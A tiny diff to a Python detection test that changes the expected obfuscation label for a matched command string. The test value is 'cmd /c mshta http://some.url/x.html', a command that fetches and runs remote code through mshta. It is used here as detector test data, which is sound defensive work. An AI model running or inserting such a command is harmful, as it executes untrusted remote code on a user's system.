@@ -9,5 +9,5 @@ def test_find_cmd_strings():
         Hit(value=b'cmd /c mshta http://some.url/x.html',
             start=13,
             end=55,
-            obfuscation='powershell.carets')
+            obfuscation='unescape.shell.carets')
     ]
